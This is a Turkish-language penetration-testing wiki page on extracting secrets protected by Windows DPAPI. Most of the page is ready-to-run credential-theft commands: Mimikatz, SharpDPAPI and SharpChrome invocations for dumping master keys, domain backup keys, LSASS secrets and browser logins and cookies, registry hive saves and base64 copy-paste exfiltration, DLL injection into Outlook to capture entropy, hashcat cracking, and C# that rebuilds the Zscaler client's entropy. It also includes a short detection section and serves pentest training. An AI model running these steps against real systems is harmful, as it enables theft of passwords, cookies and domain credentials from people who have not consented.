# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

Data Protection API (DPAPI), Windows işletim sistemi içinde temel olarak **asimetrik private key'lerin simetrik şifrelenmesi** için kullanılır ve önemli bir entropy kaynağı olarak kullanıcı veya sistem secret'larından yararlanır. Bu yaklaşım, geliştiricilerin verileri kullanıcının logon secret'larından türetilen bir key ile veya sistem şifrelemesi için sistemin domain authentication secret'larıyla şifrelemesine olanak tanıyarak şifreleme key'inin korunmasını kendilerinin yönetme gereksinimini ortadan kaldırır.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların o anda logon olmuş process'in security context'ini kullanarak verileri şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır. Varsayılan olarak verilerin şifresi yalnızca onları şifreleyen aynı user veya system context tarafından çözülebilir.<sup>[[2]](#references)[[3]](#references)</sup>

Bu fonksiyonlar ayrıca şifreleme ve şifre çözme sırasında kullanılan isteğe bağlı bir **entropy parametresi** kabul eder. İsteğe bağlı entropy ile korunan verilerin şifresinin çözülmesi için aynı entropy değerinin kullanılması gerekir.<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI, user'ın credential'larından user'a özgü bir değer (genellikle **pre-key** olarak adlandırılır) türetir. Kesin türetme işlemi account'a ve işletim sistemi sürümüne bağlıdır. Örneğin Impacket, password'ün SHA-1 digest'ini temel alan bir HMAC-SHA1 yolu, password'ün MD4/NT hash'ini temel alan başka bir yol ve Protected Users için PBKDF2-SHA256-türetilmiş bir yol dener. Bu nedenle offline tooling, gerekli materyali plaintext password'den veya mevcut bir NT hash'ten çoğu zaman türetebilir.<sup>[[2]](#references)[[10]](#references)</sup>

Bu özellikle önemlidir; çünkü bir attacker user'ın password hash'ini elde edebilirse şunları yapabilir:

- O user'ın key'i kullanılarak **DPAPI ile şifrelenmiş tüm verilerin şifresini**, herhangi bir API'ye bağlanmasına gerek kalmadan çözebilir
- Geçerli DPAPI key'ini üretmeye çalışarak **password'ü offline crack etmeyi** deneyebilir

DPAPI, korunan her blob için yeni bir master key oluşturmak yerine her user için bir veya daha fazla **master key** tutar. Her master key'in bir **GUID**'si (Globally Unique Identifier) vardır ve şifrelenmiş bir blob, kendisini hangi master key'in koruduğunu kaydeder.<sup>[[2]](#references)</sup>

Master key'ler, `{SID}` değerinin user'ın Security Identifier'ı olduğu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory'sinde saklanır. Master-key file, user'ın **pre-key**'i tarafından korunan materyali ve domain user'ları için bir **domain backup key** tarafından korunan recovery materyalini içerir.<sup>[[2]](#references)</sup>

Master key'i şifrelemek için kullanılan **domain key'in domain controller'larda bulunduğunu ve hiçbir zaman değişmediğini** unutmayın. Bu nedenle bir attacker domain controller'a erişebiliyorsa domain backup key'i alabilir ve domain'deki tüm user'ların master key'lerinin şifresini çözebilir.<sup>[[2]](#references)</sup>

Şifrelenmiş blob'lar, header'ları içinde verilerin şifrelenmesi için kullanılan **master key'in GUID**'sini içerir.

> [!TIP]
> DPAPI encrypted blob'lar **`01 00 00 00`** ile başlar

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bir kullanıcının bir grup Master Key'i şu şekilde görünür:

![DPAPI nedir - Kullanıcı anahtarı oluşturma: Bir kullanıcının bir grup Master Key'i şu şekilde görünür](<../../images/image (1121).png>)

### Machine/System key generation

Bu, makinenin verileri şifrelemek için kullandığı anahtardır. Yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtar olan **DPAPI_SYSTEM LSA secret** temel alınarak oluşturulur. Bu anahtar; machine-level credentials veya system-wide secrets gibi sistemin kendisi tarafından erişilebilir olması gereken verileri şifrelemek için kullanılır.<sup>[[2]](#references)</sup>

Bu anahtarların **domain backup'ı yoktur**, bu nedenle yalnızca yerel olarak erişilebilirler:

- **Mimikatz**, `mimikatz lsadump::secrets` komutunu kullanarak LSA secrets'ı dump edip bu anahtara erişebilir.
- Secret registry içinde depolanır; bu nedenle bir administrator, **erişmek için DACL permissions'ı değiştirebilir**. Registry path: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hives üzerinden offline extraction da mümkündür. Örneğin hedefte administrator olarak hive'ları kaydedip exfiltrate edebilirsiniz:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ardından analiz makinenizde hives içinden DPAPI_SYSTEM LSA secret'ını kurtarın ve bunu machine-scope blob'ları (scheduled task passwords, service credentials, Wi‑Fi profiles vb.) decrypt etmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Veeam'e özgü DPAPI örneği:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome parolaları ile otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesabı parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve şifreleme anahtarları dahil Windows Vault için parolalar
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçlarına yönelik özel anahtarlar için parolalar
- Credential Manager tarafından yönetilen ağ parolaları ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler
- Registry içindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wi-Fi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key extraction seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain içindeki tüm kullanıcı master key'lerini decrypt etmek için **domain backup key**'e erişebilir:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici yetkileriyle, bağlı tüm kullanıcıların DPAPI master key'lerini ve SYSTEM key'ini çıkarmak için **LSASS memory'ye erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Kullanıcının local admin ayrıcalıkları varsa, makine master key'lerinin şifresini çözmek için **DPAPI_SYSTEM LSA secret**'a erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcının master key'lerini doğrudan decrypt edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Kullanıcı olarak bir session içindeyseniz, **RPC kullanarak master key'leri decrypt etmek için DC'den backup key** istemek mümkündür. Local admin iseniz ve kullanıcı oturum açmışsa bunun için **session token'ını çalabilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listeleme
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI ile Şifrelenmiş Verilere Erişim

### DPAPI ile şifrelenmiş verileri bulma

Kullanıcılar tarafından **korunan yaygın dosyalar** şuralardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` kısmını `\Local\` olarak değiştirerek de kontrol edin.

Enumeration örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI), dosya sistemi, registry ve B64 blob'ları içindeki DPAPI şifreli blob'larını bulabilir:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
DPAPI kullanılarak cookies gibi hassas verilerin şifresini çözmek için aynı repo’dan [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) kullanılabileceğini unutmayın.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Mevcut kullanıcı, kaydedilmiş login/cookies için etkileşimli decryption (user context’te çalıştırıldığında, ekstra key kullanıcının Credential Manager’ından çözümlendiği için Chrome 127+ app-bound cookies ile bile çalışır):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Yalnızca dosyalara sahip olduğunuzda offline analysis. Önce profilin "Local State" dosyasından AES state key'i çıkarın, ardından cookie DB'yi çözmek için bunu kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) ve hedef host üzerinde admin yetkiniz olduğunda domain genelinde/uzaktan triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Bir kullanıcının DPAPI prekey/credkey bilgisine (LSASS'tan) sahipseniz, password cracking işlemini atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Daha yeni Chrome/Edge sürümleri, belirli cookies verilerini "App-Bound" encryption kullanarak depolayabilir. Bu belirli cookies verilerinin offline decryption işlemi, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcı bağlamında çalıştırın. Aşağıda referans verilen Chrome security blog gönderisine bakın.<sup>[[5]](#references)</sup>

### Erişim anahtarları ve veriler

- Mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için **SharpDPAPI** kullanın:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kimlik bilgileriyle ilgili bilgileri alın**; şifrelenmiş veriler ve guidMasterKey gibi.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Masterkey'lere erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'inin şifresini çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı, masterkey şifre çözme için şu bağımsız değişkenleri de destekler (etki alanının backup key'ini almak için `/rpc`, düz metin parola kullanmak için `/password` veya bir DPAPI etki alanı özel anahtar dosyası belirtmek için `/pvk` kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Bir masterkey kullanarak verilerin şifresini çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için aşağıdaki argümanları da destekler (`/rpc` ile domain backup key alınabildiğine, `/password` ile plaintext password kullanılabildiğine, `/pvk` ile bir DPAPI domain private key dosyası belirtilebildiğine, `/unprotect` ile mevcut kullanıcı oturumunun kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey değerini doğrudan kullanma (parola gerekmez)

LSASS dump edebiliyorsanız, Mimikatz genellikle kullanıcının masterkey'lerini plaintext parolayı bilmeden decrypt etmek için kullanılabilecek, oturum başına bir DPAPI key açığa çıkarır. Bu değeri doğrudan tooling'e geçin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile offline decryption

Victim kullanıcının SID’sine ve parolasına (veya NT hash’ine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey’lerini ve Credential Manager blob’larını tamamen offline olarak decrypt edebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Disk üzerindeki artefact’ları belirleyin:
- Credential Manager blob(lar)ı: %APPDATA%\Microsoft\Credentials\<hex>
- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- File transfer tooling sorun çıkarıyorsa dosyaları host üzerinde base64’e dönüştürün ve çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- masterkey'i kullanıcının SID'si ve parolası/hash'i ile decrypt edin:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- credential blob'un şifresini çözmek için şifresi çözülmüş masterkey'i kullanın:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu workflow, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş domain kimlik bilgilerini ve yönetici hesaplarını (ör. `*_adm`) sıklıkla kurtarır.

---

### İsteğe Bağlı Entropy'yi İşleme ("Third-party entropy")

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri gönderir. Bu değer olmadan, doğru masterkey bilinse bile blob'un şifresi çözülemez. Bu nedenle bu şekilde korunan kimlik bilgilerini hedeflerken entropy'yi elde etmek kritik önem taşır (ör. Microsoft Outlook ve bazı VPN istemcileri).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef process içindeki DPAPI işlevlerine hook ekleyen ve sağlanan tüm isteğe bağlı entropy değerlerini şeffaf biçimde kaydeden user-mode bir DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi process'lere **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran process ve blob ile eşleyen bir dosya oluşturur. Yakalanan entropy daha sonra verilerin şifresini çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) aracına sağlanabilir.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkey'leri offline cracking (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını kullanıma sundu. `hashcat` v6.2.6 (Aralık 2023), hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) desteğini ekleyerek kullanıcı parolalarının doğrudan masterkey dosyasından GPU-accelerated cracking yapılmasına olanak tanıdı. Bu nedenle saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, bunları kırılmış anahtarlarla decrypt edebilir ve cleartext password'leri dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome** araçlarında uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette bu makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmaktadır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP directory içindeki tüm kullanıcıların ve bilgisayarların çıkarılmasını ve domain controller backup key'in RPC üzerinden alınmasını otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözümler ve tüm kullanıcıların DPAPI blob'larını almak için her bilgisayarda smbclient çalıştırır; ardından domain backup key ile her şeyin şifresini çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılan bilgisayar listesiyle, daha önce bilmediğiniz alt ağların tamamını bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan secret'ları otomatik olarak dump edebilir. 2.x sürümü şu özellikleri sunmuştur:<sup>[[9]](#references)</sup>

* Yüzlerce host'tan blob'ların paralel olarak toplanması
* **context 3** masterkey'lerinin parse edilmesi ve otomatik Hashcat cracking entegrasyonu
* Chrome "App-Bound" şifreli cookie'leri için destek (sonraki bölüme bakın)
* Yeni bir `--snapshot` modu ile endpoint'lerin tekrarlı olarak sorgulanması ve yeni oluşturulan blob'ların karşılaştırılması

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault dosyalarını parse eden, Hashcat/JtR formatlarında çıktı üretebilen ve isteğe bağlı olarak cracking işlemini otomatik şekilde başlatabilen bir C# parser'ıdır. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tamamen destekler.<sup>[[8]](#references)</sup>


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilişkili diğer directory'lerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir network share üzerinden.
- LSASS memory'sine erişmek veya masterkey'leri dump etmek için **Mimikatz**, **SharpDPAPI** veya benzer tooling kullanılması.
- Event **4662**: *An object üzerinde bir işlem gerçekleştirildi* – **`BCKUPKEY`** object'ine erişimle ilişkilendirilebilir.
- Bir process'in *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiği durumlarda Event **4673/4674**

---
### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Network access'i olan bir attacker, bir domain member'ı malicious bir DPAPI backup key almaya kandırabilir ve bu da user masterkey'lerinin şifresinin çözülmesine olanak tanır. Kasım 2023 cumulative update ile patch'lenmiştir – administrator'lar DC'lerin ve workstation'ların tamamen patch'lenmiş olduğundan emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024), legacy DPAPI-only protection'ın yerini user'ın **Credential Manager** altında saklanan ek bir key ile değiştirmiştir. Cookie'lerin offline decryption işlemi artık hem DPAPI masterkey'i hem de **GCM-wrapped app-bound key** gerektirir. SharpChrome v2.3 ve DonPAPI 2.x, user context ile çalışırken ek key'i recover edebilir.<sup>[[5]](#references)</sup>


### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Custom Entropy

Zscaler Client Connector, `C:\ProgramData\Zscaler` altında çeşitli configuration file'ları saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir; ancak vendor, disk üzerinde saklanmak yerine *runtime sırasında hesaplanan* **custom entropy** sağlar.<sup>[[1]](#references)</sup>

Entropy iki elementten yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir secret.
2. Configuration'ın ait olduğu Windows account'un **SID**'i.

DLL tarafından uygulanan algorithm şuna denktir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Gizli bilgi diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropy'yi yeniden oluşturabilir** ve blob'ları offline olarak şifre çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption, her **device posture check** ve beklenen değeri dahil olmak üzere eksiksiz JSON configuration'ı ortaya çıkarır. Bu bilgi, client-side bypass girişimlerinde oldukça değerlidir.

> TIP: diğer encrypted artefact'lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy** olmadan (`16` sıfır byte) korunur. Bu nedenle SYSTEM privileges elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan decrypt edilebilirler.

## References

- [1] [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini bypass etme](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI'de security analysis ve data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz ve C++ ile DPAPI Encrypted Secrets okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows'ta Chrome cookies security'sini iyileştirme](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy'nin basit extraction yöntemi](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
